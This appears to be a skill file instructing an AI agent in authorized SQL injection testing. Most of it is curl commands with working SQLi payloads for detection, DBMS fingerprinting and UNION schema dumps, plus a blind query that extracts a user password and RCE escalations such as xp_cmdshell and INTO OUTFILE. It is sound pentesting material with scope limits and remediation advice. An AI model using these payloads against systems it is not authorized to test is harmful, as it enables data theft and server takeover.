---
name: sqli
description: SQL injection playbook — fingerprint the DBMS, confirm injection points with booleans/time/dedup, extract schema with UNION, dump data, and escalate to RLS bypass or RCE (SQLi → file write / xp_cmdshell / INTO OUTFILE). Use when a parameter or endpoint reflects DB errors, takes numeric/string filters, sort/order columns, or when you see 500s that change with quote characters, and for auth bypass via tautologies.
allowed-tools:
  - http
  - shell
  - read_payloads
  - file_write
---

# SQL injection playbook

Scope: you are testing a specific endpoint with a likely injectable parameter. Only use requests against the pinned target. No automated scanner first — build the PoC by hand so it is reproducible.

## 1. Confirm the injection point

Start with the cheapest confirmations on one parameter at a time:

```sh
# numeric: does adding a boolean change the response?
curl -ksS "https://TARGET/items?id=1"
curl -ksS "https://TARGET/items?id=1 AND 1=1"
curl -ksS "https://TARGET/items?id=1 AND 1=2"

# string: quote + comment, watch for 500 vs 200
curl -ksS "https://TARGET/search?q=foo'"
curl -ksS "https://TARGET/search?q=foo' -- -"
curl -ksS "https://TARGET/search?q=foo' OR '1'='1"

# time-based (do NOT use heavy sleeps on production — 3-5s max)
curl -ksS -w '%{time_total}\n' "https://TARGET/items?id=1 AND SLEEP(3)"
```

- `1 AND 1=1` ≠ `1 AND 1=2` → boolean blind.
- Quote → 500, quote+comment → 200 → string injection.
- Response time jumps with `SLEEP(3)` → time blind.

Record the exact parameter, the differing responses, and timings — that is your evidence.

## 2. Fingerprint the DBMS

```sh
# MySQL/MariaDB
curl -ksS "https://TARGET/items?id=1 AND @@version RLIKE '^[0-9]'"
# PostgreSQL
curl -ksS "https://TARGET/items?id=1 AND (SELECT version()) IS NOT NULL"
# SQLite
curl -ksS "https://TARGET/items?id=1 AND 1=1"   # then try: id=1 UNION SELECT sql FROM sqlite_master
# Oracle
curl -ksS "https://TARGET/items?id=1 AND 1=1"   # note: requires FROM dual in UNION
# error-based: force a DB error that leaks the engine
curl -ksS "https://TARGET/items?id=1' AND extractvalue(1,concat(0x7e,version()))-- -"
```

Error messages mentioning `SQLSTATE`, `syntax error at or near`, `near "` → engine hints. Keep them in evidence.

## 3. Column count + UNION extraction

```sh
# find column count with ORDER BY
curl -ksS "https://TARGET/items?id=1 ORDER BY 5-- -"   # 200 → ≥5 columns
# UNION: pad with NULLs until it renders
curl -ksS "https://TARGET/items?id=0 UNION SELECT NULL,NULL,NULL-- -"
curl -ksS "https://TARGET/items?id=0 UNION SELECT 1,version(),3-- -"   # MySQL
curl -ksS "https://TARGET/items?id=0 UNION SELECT 1,version(),3-- -"   # PG: version() works too
```

When the response renders the injected value, dump schema:

```sh
curl -ksS "https://TARGET/items?id=0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -"
curl -ksS "https://TARGET/items?id=0 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -"
```

Blind (no render)? Use boolean extraction or a compact time-based oracle:

```sh
curl -ksS "https://TARGET/items?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(3),0)-- -"
```

Stop at proof-of-concept level: you only need the schema names and one credential row as evidence, not a full dump.

## 4. Escalation paths (only after confirmation)

- **Auth bypass**: `' OR '1'='1' -- -` on login forms; check if the app trusts the first row.
- **RLS / multi-tenant**: if the app uses per-tenant row filtering, a UNION can bypass row-level scope — compare what `id=1` vs `id=0 UNION ...` returns for other tenants' rows.
- **RCE via SQLi** (only in authorized labs): MySQL `SELECT ... INTO OUTFILE '/tmp/x.php'`, MSSQL `EXEC xp_cmdshell 'id'`, PostgreSQL `COPY ... FROM PROGRAM 'id'`. Verify the file executes, then stop.

## 5. Reporting

Evidence needed: the request/response pair for `1=1` vs `1=2`, or the UNION render, with the exact URL. Impact: read/forge any row the DB serves (credentials, PII, orders), possibly full DB compromise. Remediation: parameterized queries, least-privilege DB user, WAF is not a fix.

When you have a reproduced injection with request/response evidence, call `confirm_finding`.
